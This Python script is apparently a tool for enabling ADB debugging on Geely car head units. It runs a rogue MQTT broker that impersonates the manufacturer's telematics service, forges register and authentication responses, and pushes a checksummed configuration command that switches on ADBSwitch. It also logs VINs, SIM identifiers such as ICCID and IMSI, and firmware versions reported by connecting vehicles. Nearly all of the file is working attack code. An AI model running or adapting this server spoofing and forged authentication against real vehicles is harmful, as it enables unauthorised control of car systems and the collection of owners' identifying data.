import asyncio
import hashlib
import json
import logging
import ssl
import struct
import sys
import time
import uuid
import argparse
import functools
from typing import Optional

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-7s  %(message)s",
    datefmt="%H:%M:%S",
    stream=sys.stdout,
    force=True,
)
log = logging.getLogger("broker")


def _compute_checksum(body_json: str) -> str:
    raw = (body_json + "ihu-push-service").encode("utf-8")
    return hashlib.md5(raw).hexdigest().upper()


def build_adb_payload(vin: str) -> "tuple[bytes, str]":
    message_id = f"adb_{int(time.time())}"
    body = {
        "type": "Sys_Config_change",
        "expiration": 9_999_999_999_999,
        "configLevel": "system",
        "configItemCode": "ADBSwitch",
        "configItemValue": "ON",
        "messageId": message_id,
    }
    body_json = json.dumps(body, separators=(",", ":"), ensure_ascii=True)
    checksum = _compute_checksum(body_json)

    header = {
        "serialNo": "adb" + uuid.uuid4().hex,
        "channel": "push",
        "checkSum": checksum,
        "action": "com.geely.systemmonitor",
        "type": "Sys_Config_change",
        "traceId": f"trace_{int(time.time())}",
        "tid": int(time.time() * 1000),
        "version": "1.0",
    }

    payload = {"header": header, "body": json.loads(body_json)}
    raw = json.dumps(payload, separators=(",", ":"), ensure_ascii=True).encode("utf-8")
    return raw, message_id


def _pb_varint(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        out.append(b | (0x80 if n else 0))
        if not n:
            return bytes(out)


def _pb_string_field(field: int, s: str) -> bytes:
    b = s.encode("utf-8")
    return _pb_varint((field << 3) | 2) + _pb_varint(len(b)) + b


def _pb_read_field(data: bytes, target: int):
    i, n = 0, len(data)

    def read_varint(i):
        shift = val = 0
        while i < n:
            b = data[i]; i += 1
            val |= (b & 0x7F) << shift
            if not (b & 0x80):
                return val, i
            shift += 7
        raise ValueError("truncated varint")

    while i < n:
        tag, i = read_varint(i)
        field, wt = tag >> 3, tag & 7
        if wt == 0:
            val, i = read_varint(i)
            if field == target:
                return val
        elif wt == 2:
            ln, i = read_varint(i)
            seg = data[i:i + ln]; i += ln
            if field == target:
                return seg
        elif wt == 1:
            if field == target:
                return data[i:i + 8]
            i += 8
        elif wt == 5:
            if field == target:
                return data[i:i + 4]
            i += 4
        else:
            break
    return None


def pb_request_serialno(payload: bytes) -> Optional[str]:
    try:
        seg = _pb_read_field(payload, 4)
    except Exception:
        return None
    return seg.decode("utf-8", "replace") if isinstance(seg, (bytes, bytearray)) else None


def build_auth_response(serial: str) -> bytes:
    return _pb_string_field(1, serial)


def build_register_response(serial: str, token: str = "brokertoken") -> bytes:
    return _pb_string_field(1, serial) + _pb_string_field(4, token)


def build_heartbeat_response(serial: str) -> bytes:
    return _pb_string_field(1, serial)


def _encode_remaining(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        out.append(b | (0x80 if n else 0))
        if not n:
            return bytes(out)


def pkt_connack(return_code: int = 0) -> bytes:
    return bytes([0x20, 0x02, 0x00, return_code])


def pkt_suback(packet_id: int, count: int = 1, qos: int = 1) -> bytes:
    body = struct.pack(">H", packet_id) + bytes([qos]) * count
    return bytes([0x90]) + _encode_remaining(len(body)) + body


def pkt_pingresp() -> bytes:
    return bytes([0xD0, 0x00])


def pkt_puback(packet_id: int) -> bytes:
    return bytes([0x40, 0x02, (packet_id >> 8) & 0xFF, packet_id & 0xFF])


def pkt_pubrec(packet_id: int) -> bytes:
    return bytes([0x50, 0x02, (packet_id >> 8) & 0xFF, packet_id & 0xFF])


def pkt_pubcomp(packet_id: int) -> bytes:
    return bytes([0x70, 0x02, (packet_id >> 8) & 0xFF, packet_id & 0xFF])


def pkt_publish_qos1(topic: str, payload: bytes, packet_id: int = 1) -> bytes:
    t = topic.encode("utf-8")
    body = struct.pack(">H", len(t)) + t + struct.pack(">H", packet_id) + payload
    return bytes([0x32]) + _encode_remaining(len(body)) + body


def parse_publish(data: bytes, qos: int):
    offset = 0
    tlen = struct.unpack_from(">H", data, offset)[0]; offset += 2
    topic = data[offset: offset + tlen].decode("utf-8", "replace"); offset += tlen
    packet_id = None
    if qos > 0:
        packet_id = struct.unpack_from(">H", data, offset)[0]; offset += 2
    return topic, packet_id, data[offset:]


STATUS_LABELS = {
    "received":    "RECEIVED  - command accepted by the car",
    "startExec":   "START     - applying",
    "executing":   "EXECUTING - in progress",
    "execSuccess": "SUCCESS   - applied (read-back confirmed the value)",
    "execFail":    "FAILED    - apply failed",
}

_INTERESTING = (
    "configItemCode", "configItemValue", "code", "message", "status",
    "messageId", "mesaageId",
    "vin", "ihuId", "temId", "xdsn", "pcode", "msisdn", "iccid", "imsi",
    "sysVersion", "softVersion", "hardVersion", "mcuVersion",
)


def _walk_json(obj, found: dict):
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in _INTERESTING and k not in found and not isinstance(v, (dict, list)):
                found[k] = v
            _walk_json(v, found)
    elif isinstance(obj, list):
        for it in obj:
            _walk_json(it, found)
    elif isinstance(obj, str):
        s = obj.strip()
        if s[:1] in ("{", "["):
            try:
                _walk_json(json.loads(s), found)
            except Exception:
                pass


def handle_uplink(topic: str, payload: bytes, expected_msg_id: Optional[str], dump_file: Optional[str]):
    text = payload.decode("utf-8", "replace")
    if dump_file:
        try:
            with open(dump_file, "a", encoding="utf-8") as fh:
                fh.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{topic}\t{text}\n")
        except Exception as exc:
            log.warning(f"could not write dump file: {exc}")

    try:
        obj = json.loads(text)
    except Exception:
        log.info(f"[<] {topic}  (non-JSON, {len(payload)}B): {text[:200]}")
        return

    found: dict = {}
    _walk_json(obj, found)
    code = found.get("code")
    item = found.get("configItemCode")
    val = found.get("configItemValue")
    msg = found.get("message")
    mid = found.get("messageId") or found.get("mesaageId")

    if code in STATUS_LABELS or item:
        line = f"[<] STATUS {STATUS_LABELS.get(code, code or '?')}"
        if item:
            line += f"  item={item} value={val!r}"
        if mid:
            line += f"  messageId={mid}"
        if expected_msg_id and mid == expected_msg_id:
            line += "  <- OUR command"
        if msg:
            line += f"  msg={str(msg)[:300]!r}"
        if code == "execFail":
            log.error(line)
            log.error("    -> the car RECEIVED the command but did NOT apply it. Reason is in the msg field above.")
        elif code == "execSuccess":
            log.info(line)
            if item == "ADBSwitch":
                log.info("    -> ADBSwitch applied: persist.switch.usbmode=true. Re-enter the engineering menu / reboot the head unit.")
        else:
            log.info(line)
        return

    dev = {k: found[k] for k in ("vin", "ihuId", "temId", "xdsn", "pcode", "sysVersion") if k in found}
    if dev:
        log.info(f"[<] identity/vehicle report  device={dev}")
        return

    log.info(f"[<] {topic}  {text[:200]}")


def oneos_push_vin(topic: str) -> Optional[str]:
    p = topic.split("/")
    if len(p) == 4 and p[0] == "oneos" and p[2] == "push" and p[3] in ("command", "message"):
        return p[1]
    return None


async def _read_packet(reader: asyncio.StreamReader):
    first = await reader.readexactly(1)
    msg_type = (first[0] >> 4) & 0x0F
    flags = first[0] & 0x0F

    remaining = 0
    multiplier = 1
    while True:
        b = (await reader.readexactly(1))[0]
        remaining += (b & 0x7F) * multiplier
        multiplier <<= 7
        if not (b & 0x80):
            break

    data = await reader.readexactly(remaining) if remaining else b""
    return msg_type, flags, data


async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                        *, watch: bool = False, dump_file: Optional[str] = None):
    peer = writer.get_extra_info("peername")
    log.info(f"[+] connection from {peer}")
    vin: Optional[str] = None
    authed = False
    last_msg_id: Optional[str] = None
    cmd_sent: set = set()
    out_pid = 0

    async def publish(topic: str, payload: bytes):
        nonlocal out_pid
        out_pid = (out_pid % 60000) + 1
        writer.write(pkt_publish_qos1(topic, payload, out_pid))
        await writer.drain()

    async def send_command(topic: str):
        nonlocal last_msg_id
        if watch or topic in cmd_sent:
            return
        cmd_sent.add(topic)
        v = oneos_push_vin(topic) or vin
        payload, last_msg_id = build_adb_payload(v)
        await publish(topic, payload)
        log.info(f"[>] ADB-enable command sent to {topic} (messageId={last_msg_id})")

    async def handle_auth_uplink(topic: str, payload: bytes) -> bool:
        nonlocal authed
        p = topic.split("/")
        if len(p) < 3 or p[0] != "tspComm":
            return False
        tsp_id = p[1]
        serial = pb_request_serialno(payload)
        if topic == f"tspComm/{tsp_id}/account/register":
            log.info(f"[A] tspComm REGISTER serial={serial}  -> forging RegisterResponse(result=0)")
            if serial:
                await publish(f"tspComm/{tsp_id}/downlink/register", build_register_response(serial))
            return True
        if topic == f"tspComm/{tsp_id}/account/auth":
            log.info(f"[A] tspComm AUTH serial={serial}  -> forging AuthResponse(result=0) => AUTH_SUCCESS")
            if serial:
                await publish(f"tspComm/{tsp_id}/downlink/auth", build_auth_response(serial))
                authed = True
            return True
        if topic == f"tspComm/{tsp_id}/heartbeat":
            log.debug(f"[A] tspComm HEARTBEAT serial={serial} -> HeartbeatResponse(result=0)")
            if serial:
                await publish(f"tspComm/{tsp_id}/downlink/heartbeat", build_heartbeat_response(serial))
            return True
        return False

    try:
        while True:
            try:
                msg_type, flags, data = await asyncio.wait_for(_read_packet(reader), timeout=180)
            except asyncio.TimeoutError:
                log.info(f"[-] idle timeout for {peer}")
                break

            if msg_type == 1:
                offset = 0
                pname_len = struct.unpack_from(">H", data, offset)[0]
                offset += 2 + pname_len
                offset += 1
                _flags = data[offset]; offset += 1
                _keepalive = struct.unpack_from(">H", data, offset)[0]; offset += 2
                cid_len = struct.unpack_from(">H", data, offset)[0]; offset += 2
                client_id = data[offset: offset + cid_len].decode("utf-8", errors="replace")
                offset += cid_len
                log.info(f"[C] CONNECT client_id={client_id!r}")

                prefix = "znzc-ihupush-"
                if client_id.startswith(prefix):
                    rest = client_id[len(prefix):]
                    dash = rest.rfind("-")
                    if dash > 0 and len(rest) - dash - 1 == 24:
                        vin = rest[:dash]
                        log.info(f"[V] VIN={vin}")
                writer.write(pkt_connack(0))
                await writer.drain()

            elif msg_type == 8:
                pid = struct.unpack_from(">H", data)[0]
                offset = 2
                topics = []
                while offset < len(data):
                    tl = struct.unpack_from(">H", data, offset)[0]; offset += 2
                    topic = data[offset: offset + tl].decode("utf-8", errors="replace")
                    offset += tl + 1
                    topics.append(topic)
                    log.info(f"[S] SUBSCRIBE {topic!r}")
                    if not vin:
                        pv = oneos_push_vin(topic)
                        if pv:
                            vin = pv
                writer.write(pkt_suback(pid, count=len(topics) or 1))
                await writer.drain()

                for topic in topics:
                    if oneos_push_vin(topic):
                        if authed:
                            await send_command(topic)
                        elif not watch:
                            log.info(f"[i] saw {topic} but not authed yet — will not deliver")

            elif msg_type == 3:
                qos = (flags >> 1) & 0x03
                try:
                    topic, pid, payload = parse_publish(data, qos)
                except Exception as exc:
                    log.warning(f"[<] malformed PUBLISH: {exc}")
                    continue
                if qos == 1 and pid is not None:
                    writer.write(pkt_puback(pid)); await writer.drain()
                elif qos == 2 and pid is not None:
                    writer.write(pkt_pubrec(pid)); await writer.drain()

                if not await handle_auth_uplink(topic, payload):
                    handle_uplink(topic, payload, last_msg_id, dump_file)

            elif msg_type == 6:
                pid = struct.unpack_from(">H", data)[0]
                writer.write(pkt_pubcomp(pid)); await writer.drain()

            elif msg_type == 4:
                pid = struct.unpack_from(">H", data)[0]
                log.debug(f"[A] PUBACK pid={pid}")

            elif msg_type == 12:
                writer.write(pkt_pingresp()); await writer.drain()

            elif msg_type == 14:
                log.info(f"[-] DISCONNECT from {peer} (VIN={vin})")
                break

            else:
                log.debug(f"    unhandled msg_type={msg_type}")

    except asyncio.IncompleteReadError:
        log.info(f"[-] connection closed by {peer}")
    except ConnectionResetError:
        log.info(f"[-] connection reset by {peer}")
    except Exception as exc:
        log.exception(f"[!] error handling {peer}: {exc}")
    finally:
        try:
            writer.close()
        except Exception:
            pass
        log.info(f"[-] disconnected {peer} (VIN={vin or 'unknown'})")


async def main(host: str, port: int, certfile: Optional[str], keyfile: Optional[str],
               watch: bool = False, dump_file: Optional[str] = None,
               handshake_timeout: float = 10.0):
    ssl_ctx = None
    if certfile and keyfile:
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_ctx.load_cert_chain(certfile, keyfile)
        ssl_ctx.verify_mode = ssl.CERT_NONE
        log.info(f"TLS enabled (cert={certfile})")
    else:
        log.warning("Running WITHOUT TLS — only works if the car is in SIT mode")

    if watch:
        log.info("WATCH mode — auth handshake will complete, but NO ADB command will be sent")
    if dump_file:
        log.info(f"Raw uplink will be appended to {dump_file}")

    handler = functools.partial(handle_client, watch=watch, dump_file=dump_file)
    extra = {"ssl_handshake_timeout": handshake_timeout} if ssl_ctx else {}
    server = await asyncio.start_server(handler, host, port, ssl=ssl_ctx, **extra)
    addrs = ", ".join(str(s.getsockname()) for s in server.sockets)
    log.info(f"MQTT broker listening on {addrs}")
    async with server:
        await server.serve_forever()


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Geely ADB Enable MQTT Broker")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=8883)
    ap.add_argument("--cert", help="Path to TLS certificate (fullchain.pem)")
    ap.add_argument("--key",  help="Path to TLS private key (privkey.pem)")
    ap.add_argument("--no-tls", action="store_true", help="Disable TLS (plain TCP)")
    ap.add_argument("--watch", action="store_true",
                    help="Complete the auth handshake and log uplink, but do NOT send the ADB command")
    ap.add_argument("--dump-file", help="Append every raw uplink payload to this file (tab-separated)")
    ap.add_argument("--debug", action="store_true", help="Verbose logging (DEBUG)")
    ap.add_argument("--handshake-timeout", type=float, default=10.0,
                    help="Seconds to wait for the TLS handshake before giving up (default: 10)")
    args = ap.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    cert = None if args.no_tls else args.cert
    key  = None if args.no_tls else args.key
    if not args.no_tls and (not cert or not key):
        ap.error("--cert and --key are required unless --no-tls is given")

    asyncio.run(main(args.host, args.port, cert, key, watch=args.watch, dump_file=args.dump_file,
                     handshake_timeout=args.handshake_timeout))
